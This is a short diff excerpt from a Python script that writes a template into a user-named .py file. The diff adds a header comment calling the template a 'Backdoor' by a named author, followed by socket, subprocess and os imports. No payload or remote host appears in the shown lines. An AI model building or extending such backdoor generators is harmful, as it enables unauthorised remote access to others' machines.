@@ -74,6 +74,9 @@ file_name = input("[!] Insert a file name.py: ")
 arq = open(file_name, 'w')
 finish()
 temp = """
+# Backdoor coded by: Gr3n0xX
+# Python 3.9
+
 import socket
 import subprocess
 import os
